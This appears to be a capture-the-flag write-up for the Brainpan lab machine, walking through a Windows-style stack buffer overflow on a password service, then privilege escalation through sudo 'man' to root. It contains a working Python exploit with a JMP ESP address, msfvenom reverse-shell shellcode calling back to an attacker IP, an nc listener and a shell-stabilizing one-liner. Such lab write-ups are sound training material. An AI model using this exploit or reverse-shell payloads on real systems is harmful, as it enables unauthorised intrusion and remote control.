### Scanning

We will start with scanning our machine 

```
PORT      STATE SERVICE VERSION
9999/tcp  open  abyss?

|   NULL: 
|     _| _| 
|     _|_|_| _| _|_| _|_|_| _|_|_| _|_|_| _|_|_| _|_|_|

|     [________________________ WELCOME TO BRAINPAN _________________________]
|_    ENTER THE PASSWORD
10000/tcp open  http    SimpleHTTPServer 0.6 (Python 2.7.3)
```

We will find that there is a SimpleHTTPServer on our target so let's start with seeing it's content

![img-description](/assets/img/Brainpan/Brainban_site.png)
_Website_

as we can see there is just an image nothing special so let's Fuzz it and see what we can get

![img-description](/assets/img/Brainpan/Brainban_Fuzz.png)
_Fuzzing Dir_

we will find that there is a dir called bin so let's go to it and see it's content

![img-description](/assets/img/Brainpan/Brainban_App.png)
_App_

### Exploiting the BOF

Now let's see what this application is, open the application in the immunity debugger and start running it with the red run icon you will find that there is a cmd window saying **[+] Listening for connections.**

So let's connect to it and see what we will get

```
nc (the ip of the device you have opened the app on) 9999

    _|                            _|                                        
    _|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|

                                                _|                          
                                                _|

    [________________________ WELCOME TO BRAINPAN _________________________]
                            ENTER THE PASSWORD                              

                            >> Hello
                            ACCESS DENIED


```
We will see that it is a simple application which waiting for you to enter a password, so let's start to check if there is any possibility for a buffer overflow here

#### Mona Configuration

Mona is a script that can be used to automate and speed up specific searches while developing exploits it works on immunity debugger, we need to Set a working folder with this command (run in the command input box at the bottom of the Immunity Debugger window)
```
!mona config -set workingfolder c:\mona\%p
```
This ensures that all Mona-generated outputs (like logs, patterns, and offsets) are saved in a dedicated directory.

#### Fuzzing

Starting by fuzzing our target using this script

```
#!/usr/bin/env python3

import socket
import time

# Set target details
ip = "192.168.1.xx"  # Change this to match your target
port = 9999 

payload = "A" * 100  # Start with 100 bytes
increment = 100  # Increase size by 100 bytes each loop
timeout = 5  # Timeout for socket connection

while True:
    try:
        print(f"Fuzzing with {len(payload)} bytes")

        # Create a new socket connection for each attempt
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((ip, port))

        # Send the payload and read the response
        s.sendall(payload.encode() + b"\n")
        response = s.recv(1024).decode(errors="ignore")
        print("Server Response:", response)

        # Close the connection
        s.close()

    except socket.error as e:
        print(f"Fuzzing crashed at {len(payload)} bytes: {e}")
        break  # Stop if a crash occurs

    # Increase payload size
    payload += "A" * increment
    time.sleep(1)  # Short delay before the next attempt
```
After running the script you will find that it crached at 700 bytes

```
Fuzzing crashed at 700 bytes: timed out
```

#### Crash Replication & Controlling EIP

Now as we know when it crached let's start to gain access to our system we will start with this script:

```
import socket

ip = "192.168.1.xx"
port = 9999

offset = 0
overflow = "A" * offset
retn = ""
padding = ""
payload = ""
postfix = ""

buffer = overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```

Now Run the following command to generate a cyclic pattern of a length 400 bytes longer that the string that crashed the server

```
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1100
```

A cyclic pattern is a unique sequence of characters generated using pattern_create.rb. The goal is to identify the exact position in the input where the Extended Instruction Pointer (EIP) is overwritten.

**Ex:** If you send "AAAAA..." and the crash doesnâ€™t tell you where in the payload EIP is overwritten, a cyclic pattern helps pinpoint the exact offset.

Put the output of the command in the payload string in our script, and go back to the immunity debugger reopen the application "Ctrl + F2" and then click the red icon again to run it and then run the script.

after succesfully doing the last step we need now to know the exact EIP offset that it crached on it so we will run this command

```
!mona findmsp -distance 1100
```

![img-description](/assets/img/Brainpan/Brainban_EIP.png)
_EIP Offset_

And we will find that the exact offset is 524.

Now restart the appliaction in immunity debugger and run it again, then update the exploit script and set the offset variable to this value (was previously set to 0). Set the payload variable to an empty string again. Set the retn variable to "BBBB" and we will find that the EIP register is overwritten succesfully which means that we have the right value.

_EIP Overwrite_

#### Finding Bad Characters

We need to Identify bytes that cause issues during payload delivery and remove them from our payload.

Bad characters, like \x00 (null byte), can terminate strings prematurely or corrupt data, causing the payload to fail so we need to remove them.

Generate a bytearray from \x01 to \xff, excluding null bytes (\x00). This serves as our reference for comparison.

```
!mona bytearray -b "\x00"
```

Now generate a string of bad chars that is identical to the bytearray:

```
for x in range(1, 256):
  print("\\x" + "{:02x}".format(x), end='')
print()
```

Update your exploit script and set the payload variable to the string of bad chars the script generates, restart and run the appliaction again and then run the exploit script.

Now make a note of the address to which the ESP register points which is in my case **005FF910**

```
!mona compare -f C:\mona\gatekeeper\bytearray.bin -a 005FF910
```

A popup window should appear labelled "mona Memory comparison results". The window shows the results of the comparison, indicating any characters that are different in memory to what they are in the generated bytearray.bin file.

![img-description](/assets/img/Brainpan/Brainban_Badchars.png)
_Bad Chars_

As we see the results status returns "Unmodified". This indicates that there is no badchars exist.

#### Finding a Jump Point

Now run the following command, making sure to update the -cpb option with the badchars we have **just (\x00)**:

```
!mona jmp -r esp -cpb "\x00"
```

This command finds all "jmp esp" (or equivalent) instructions with addresses that don't contain any of the badchars specified.

![img-description](/assets/img/Brainpan/Brainban_Jmp.png)
_JMP ESP_

Choose an address and update your exploit.py script, setting the "retn" variable to the address, written backwards (since the system is little endian). For example if the address is \x01\x02\x03\x04 in Immunity, write it as \x04\x03\x02\x01 in your exploit.

#### Generate Payload

Run the following msfvenom command on Kali for making the reverse shell payload:

```
msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=1234 EXITFUNC=thread -b "\x00\x0a" -f c
```

Copy the generated C code strings and put them into your exploit script payload variable.

#### Prepend NOPs

Encoders used in msfvenom may require additional space in memory for the payload to decode and execute so we can do this by setting the padding variable to a string of 16 or more "No Operation" (\x90) bytes:

```
padding = "\x90" * 16
```

#### Exploit

Now our exploit script should be something like this

```
import socket

ip = "192.168.1.xx"
port = 9999

offset = 524
overflow = "A" * offset
retn = "\xF3\x12\x17\x31"
padding = "\x90" * 16
payload = ("\xd9\xea\xd9\x74\x24\xf4\xbb\x1d\x6d\x85\x7f\x58\x31\xc9"
"\xb1\x52\x83\xe8\xfc\x31\x58\x13\x03\x45\x7e\x67\x8a\x89"

"\x6a\xfe\xc3\xe2\x6f\xba\x43\x1f\x02\xd3\x21\x1f\xb1\xd4"
"\x63")
postfix = ""

buffer = overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```

If you are sure that everything is right you can now start a nc listener on your kali to get the connection

```
nc -nlvp 1234
```

reopen the application and click the red icon again to run it and then run the exploit script and wait for the connection
and you will find that we have recieved back a connection and now we are in the system.

### Initial Access

Now we know everything works perfectly let's now connect to the machine just change the ip in the script to connect to the thm machine instead of your local machine 

![img-description](/assets/img/Brainpan/Brainban_Access.png)
_User access_

after running the script you will find that you have now access to the server

after some exploring i think we got the wrong shell because there is clearly a linux file system in here and also there is a shell script in the dir we are in

![img-description](/assets/img/Brainpan/Brainban_sh.png)
_sh script_

So we need to change our shell using this command

```
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.21.105.110 LPORT=1234 EXITFUNC=thread -b "\x00" -f c
```

Run the script again and Now we have a shell, let's stabilize it using this command

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

### Privilege Escalation

After getting the user access and getting a good shell we will see what are our privilege on this system

![img-description](/assets/img/Brainpan/Brainban_Priv.png)
_Priv_

We will see that we have sudo priv on some file so we will run it and we will find that we can use some commands after it, let's look at the last one which let us use the manual command and after it type any command and it will show us the manual page of it.

```
sudo /home/anansi/bin/anansi_util manual whoami
```

we will see that it opened the manual page of the command so we can exploit this easily as we can find how can we do this by visiting [GTFOBins](https://gtfobins.github.io/gtfobins/man/)

let's try the exploit.

![img-description](/assets/img/Brainpan/Brainban_Root.png)
_Root Access_

and we will find that now we have root access.
